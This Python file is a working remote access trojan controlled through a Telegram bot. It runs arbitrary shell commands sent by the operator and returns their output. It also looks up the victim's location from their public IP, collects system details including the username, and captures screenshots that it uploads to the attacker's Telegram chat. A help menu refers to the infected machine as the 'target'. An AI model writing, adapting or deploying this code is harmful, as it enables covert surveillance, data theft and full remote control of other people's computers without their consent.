import os
import platform
import requests
import subprocess
import time

try:
    from PIL import ImageGrab
except ImportError:
    if platform.system().startswith("Windows"):
        os.system("python -m pip install pillow -q -q -q")
        from PIL import ImageGrab
    elif platform.system().startswith("Linux"):
        os.system("python3 -m pip install pillow -q -q -q")
        from PIL import ImageGrab

TOKEN = '<Token>'  # Use your Telegram bot token
CHAT_ID = '<ChatID>'  # Use your chat ID
processed_message_ids = []

def get_updates(offset=None):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
        params = {'offset': offset, 'timeout': 60}
        response = requests.get(url, params=params)
        response.raise_for_status()
        data = response.json()
        return data.get('result', [])
    except Exception as e:
        print(f"Failed to get updates: {str(e)}")
        return []

def execute_command(command):
    try:
        if command == 'cd ..':
            os.chdir('..')
            return "Changed current directory to: " + os.getcwd()
        elif command == 'location':
            response = requests.get('https://ifconfig.me/ip')
            public_ip = response.text.strip()

            try:
                url = f'http://ip-api.com/json/{public_ip}'
                response = requests.get(url)
                data = response.json()
                country = data.get('country')
                region = data.get('region')
                city = data.get('city')
                lat = data.get('lat')
                lon = data.get('lon')
                timezone = data.get('timezone')
                isp = data.get('isp')

                final = f"Country: {country},\nRegion: {region},\nCity: {city},\nLatitude: {lat},\nLongitude: {lon},\nTimezone: {timezone},\nISP: {isp}"
                return final
            except Exception as e:
                return 'Some error occurred'
        elif command == 'info':
            # Get system information
            system_info = {
                'Platform': platform.platform(),
                'System': platform.system(),
                'Node Name': platform.node(),
                'Release': platform.release(),
                'Version': platform.version(),
                'Machine': platform.machine(),
                'Processor': platform.processor(),
                'CPU Cores': os.cpu_count(),
                'Username': os.getlogin(),
            }
            info_string = '\n'.join(f"{key}: {value}" for key, value in system_info.items())
            return info_string
        elif command == 'screenshot':
            file_path = "screenshot.png"
            try:
                screenshot = ImageGrab.grab()
                screenshot.save(file_path)
                send_file(file_path)
                os.remove(file_path)
                return "Screenshot sent to Telegram."
            except Exception as e:
                return f"Error taking screenshot: {str(e)}"
        elif command.startswith('ping '): # Extract the target host or IP address from the command
            target = command[len('ping '):].strip()
    
            try:
                # Use the 'ping' command to ping the target
                result = subprocess.check_output(f'ping -c 4 {target}', shell=True, stderr=subprocess.STDOUT)
                return result.decode('utf-8').strip()
            except subprocess.CalledProcessError as e:
                return f"Ping failed. Error: {e.output.decode('utf-8').strip()}"        
                
        elif command == 'help':
            return '''
            HELP MENU:
            cd ..               | Change the current directory
            location            | Get target location
            info                | Get system info
            screenshot          | Capture screenshot
            ping                | ping for linux with 4 count 
            '''
        else:
            try:
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                return result.decode('utf-8').strip()
            except subprocess.CalledProcessError as e:
                return f"Command execution failed. Error: {e.output.decode('utf-8').strip()}"
            except Exception as e:
                return f"An error occurred: {str(e)}"

    except Exception as e:
        return f"An error occurred: {str(e)}"

def send_file(filename):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
        with open(filename, 'rb') as file:
            files = {'document': file}
            data = {'chat_id': CHAT_ID}
            response = requests.post(url, data=data, files=files)
            response.raise_for_status()
    except Exception as e:
        print(f"Failed to send file: {str(e)}")

def handle_updates(updates):
    highest_update_id = 0
    for update in updates:
        if 'message' in update and 'text' in update['message']:
            message_text = update['message']['text']
            message_id = update['message']['message_id']
            if message_id in processed_message_ids:
                continue
            processed_message_ids.append(message_id)
            result = execute_command(message_text)
            if result:
                send_message(result)
        update_id = update['update_id']
        if update_id > highest_update_id:
            highest_update_id = update_id
    return highest_update_id

def send_message(text):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        params = {
            'chat_id': CHAT_ID,
            'text': text
        }
        response = requests.get(url, params=params)
        response.raise_for_status()
    except Exception as e:
        print(f"Failed to send message: {str(e)}")

def main():
    offset = None
    while True:
        updates = get_updates(offset)
        if updates:
            offset = handle_updates(updates) + 1
            processed_message_ids.clear()
        else:
            print("No updates found.")
        time.sleep(1)

if __name__ == '__main__':
    main()
